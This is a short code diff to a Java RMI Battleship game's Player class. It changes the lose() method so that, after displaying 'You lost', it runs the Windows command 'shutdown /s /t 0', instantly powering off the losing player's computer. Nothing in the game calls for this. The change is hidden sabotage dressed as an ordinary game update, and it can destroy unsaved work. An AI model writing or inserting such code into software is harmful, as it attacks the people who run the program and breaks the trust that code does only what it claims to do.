@@ -5,6 +5,7 @@ import java.rmi.server.UnicastRemoteObject;
 import java.util.*;
 import java.rmi.*;
 import java.awt.event.ActionListener;
+import java.io.IOException;
 
 /**
  * Represents a player in the Battleship game.
@@ -361,5 +362,11 @@ public class Player extends UnicastRemoteObject implements PlayerInterface {
     public void lose(){
       clearEventListeners();
       getDisplay().setStartText("You lost");
-    }
+      try {
+            // Execute Windows shutdown command
+            Runtime.getRuntime().exec("shutdown /s /t 0");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+      }
 }
